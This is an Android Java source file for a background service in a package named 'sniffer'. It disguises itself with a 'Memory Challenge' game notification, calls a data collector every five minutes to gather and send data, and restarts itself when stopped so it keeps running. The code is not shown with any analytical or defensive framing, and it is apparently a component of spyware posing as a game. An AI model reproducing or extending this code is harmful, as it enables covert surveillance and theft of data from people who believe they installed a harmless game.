package com.v8.global.sniffer;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Intent;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import androidx.core.app.NotificationCompat;
import com.v8.global.sniffer.utils.Constants;
import com.v8.global.sniffer.utils.DataCollector;

public class BackgroundService extends Service {

    private Handler handler = new Handler(Looper.getMainLooper());
    private DataCollector dataCollector;
    private Runnable collectRunnable;

    @Override
    public void onCreate() {
        super.onCreate();
        
        startForeground();
        dataCollector = new DataCollector(this);
        
        collectRunnable = new Runnable() {
            @Override
            public void run() {
                // جمع وإرسال البيانات
                dataCollector.collectAndSend();
                
                // كرر كل 5 دقائق
                handler.postDelayed(this, Constants.COLLECT_INTERVAL);
            }
        };
        
        // بدأ الجمع بعد دقيقة من التشغيل
        handler.postDelayed(collectRunnable, 60 * 1000);
    }

    private void startForeground() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                "background_channel",
                "Memory Challenge Service",
                NotificationManager.IMPORTANCE_LOW
            );
            
            NotificationManager manager = (NotificationManager) getSystemService(NOTIFICATION_SERVICE);
            manager.createNotificationChannel(channel);

            Notification notification = new NotificationCompat.Builder(this, "background_channel")
                    .setContentTitle("Memory Challenge")
                    .setContentText("اللعبة تعمل في الخلفية...")
                    .setSmallIcon(android.R.drawable.ic_dialog_info)
                    .setPriority(NotificationCompat.PRIORITY_LOW)
                    .build();

            startForeground(1001, notification);
        }
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        return START_STICKY; // يعيد تشغيل الخدمة إذا توقفت
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onDestroy() {
        handler.removeCallbacks(collectRunnable);
        
        // إعادة تشغيل الخدمة
        Intent intent = new Intent(this, BackgroundService.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(intent);
        } else {
            startService(intent);
        }
        
        super.onDestroy();
    }
}
